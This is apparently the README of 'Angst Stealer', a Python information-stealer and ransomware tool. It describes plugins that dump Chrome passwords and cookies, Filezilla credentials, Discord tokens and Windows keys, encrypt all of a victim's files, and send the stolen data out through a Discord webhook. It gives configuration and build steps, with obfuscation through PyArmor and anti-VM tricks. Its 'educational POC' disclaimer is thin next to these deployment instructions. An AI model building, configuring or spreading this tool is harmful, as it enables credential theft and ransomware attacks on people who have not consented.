## Angst Stealer
AngstStealer is a POC malware which is designed to highlight and utilize Discord as an attack vector. While it is fully functioning it was created for educational purpose's, please do not use misuse this tool. Angst Stealer currently has a total of 6 plugins:

|Plugin |Description |
|------ |----------- |
|Chrome | The chrome plugin dumps all of the users passwords, websites, and usernames. |
|Filezilla | Checks to see if the user has Filezilla installed, if they do then it dumps stored Filezilla creds. |
| Ransomware | Encrypts all files on the victims computer, drops a note also. |
| Discord | Dumps discord token for Chrome and Discord. |
| Send | Zips and sends all the files through the Discord webhook. |
| User | Drops userdata about the victim such as IP, Username and Computername. |
| Windows | Also drops the windows activation key for the victims computer. |

### Setup
1. Install python [here](https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe)
2. Clone this repo using `git clone https://github.com/backslash/AngstStealer` or manually download it.
3. Run `cd folderpath` so that you are inside the directory itself.
4. Install the required libraries using `pip install -r requirements.txt`
5. Inside the main file you will see a config template, modify it so it matches your requirements.
```
CONFIG = {
    "webhook" : "",
    "software": {
        "chrome" : True,
        "chromecookies": True,
        "filezilla": True,
        "discord": True,
        "screenshot": True,
        "windows": True
    }
}

```
webhook -> The discord webhook link which you want it to use. </br>
chrome -> If it should include chrome passwords </br>
filezilla -> Should it include possible saved filezilla passwords</br>
windows -> Give information about your victim & includes the windows key</br>
discord -> Steal discord tokens</br>
screenshot -> takes a screenshot</br>
6. Run one of the following commands listed below, it is worth noting that pyarmor will sometimes corrupt the executable so if you plan on using the pyarmor command you should test it locally to make sure it works.</br>
`PYINSTALLER: pyinstaller --onefile --hidden-import=pkg_resources.py2_warn angst.py`</br>
`PYARMOR: pyarmor pack -e " --onefile --hidden-import=pkg_resources.py2_warn" angst.py`</br>

### To Do List
- [x] Add cookie support (just got lazy and forgot)
- [ ] Add more browsers
- [x] Implement some anti-vm tricks.
- [ ] Add more plugins

### Adding Plugins
Adding custom plugins is incredibly easy, here is a short example of how you make and integrate your own custom plugin for Angst:

1. First off you will want to create your plugin preferably in your plugins folder. The plugin can have as many function as needed, the example I provided below has one function called retrieve_data which will retrieve our sensitive data. Our dump function is needed for proper plugin integration because this is how all the functions know to dump there data.
```python
import requests

class ExamplePlugin(object):
	def __init__(self):
		self.sensitive_data = ""

	def retrieve_data(self):
		view_website = requests.get("https://api.ipify.org")
		self.sensitve_data = view_website.text

	def dump(self):
		self.retrieve_data()
		return self.sensitive_data
	
```
2. Next we want to add our example function to our main file which is `angst.py` in our `angst.py` do 
```from plugins.exampleplugin import ExamplePlugin```
change your import name on whatever you named your file and whatever you called the plugin class. 
3. Lastly we want to add it to our `config["software"]` and the `self.plugins` as show below.
```
    "software": {
        "chrome" : True,
        "chromecookies": True,
        "filezilla": True,
        "discord": True,
        "screenshot": True,
        "windows": True
    }
```
```
self.plugins = {
            "chrome": Chrome(),
            "chromecookies": Cookies(),
            "filezilla": Filezilla(),
            "discord": Discord(),
            "screenshot": Screenshot(),
            "windows": Windows()
        }
```
Make sure you use the exact same name when you put it under the config and self.plugins since it is case sensitive.


### Additional
Use this responsibly, I made this just as a demonstration of a POC. The fact that Discord still hasn't implemented any safegaurds or preventive measures when it comes to something like this is kind've embarrasing. Regardless though, using this without the consent of the computer owner is illegal.
